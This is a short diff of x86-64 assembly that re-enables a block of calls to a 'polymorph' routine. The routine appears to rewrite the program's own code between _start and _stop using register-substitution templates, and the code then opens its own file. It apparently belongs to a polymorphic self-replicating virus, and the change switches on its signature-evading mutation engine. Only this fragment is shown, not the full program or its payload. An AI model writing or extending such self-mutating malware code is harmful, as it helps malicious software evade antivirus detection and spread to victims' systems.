@@ -40,28 +40,28 @@ _start:
 	inc		rax
 	mov		[rax], byte '/'
 	inc		rax
-	;lea		rax, [rel _start]
-	;lea		rdi, [rel _stop]
-	;lea		rdx, [rel templates_rdi]
-	;mov		r8, 7
-	;mov		r9, 4
-	;call	polymorph
-	;lea		rdx, [rel templates_rax]
-	;call	polymorph
-	;lea		rdx, [rel templates_rsi]
-	;call	polymorph
-	;lea		rdx, [rel templates_rdx]
-	;call	polymorph
-	;lea		rdx, [rel templates_rcx]
-	;call	polymorph
-	;lea		rdx, [rel templates_r10]
-	;call	polymorph
-	;lea		rdx, [rel templates_r11]
-	;call	polymorph
-	;lea		rdx, [rel templates_r13]
-	;call	polymorph
-	;lea		rdx, [rel templates_r15]
-	;call	polymorph
+	lea		rax, [rel _start]
+	lea		rdi, [rel _stop]
+	lea		rdx, [rel templates_rdi]
+	mov		r8, 7
+	mov		r9, 4
+	call	polymorph
+	lea		rdx, [rel templates_rax]
+	call	polymorph
+	lea		rdx, [rel templates_rsi]
+	call	polymorph
+	lea		rdx, [rel templates_rdx]
+	call	polymorph
+	lea		rdx, [rel templates_rcx]
+	call	polymorph
+	lea		rdx, [rel templates_r10]
+	call	polymorph
+	lea		rdx, [rel templates_r11]
+	call	polymorph
+	lea		rdx, [rel templates_r13]
+	call	polymorph
+	lea		rdx, [rel templates_r15]
+	call	polymorph
 
 	mov		rax, SYS_open
 	lea		rdi, [rel self]
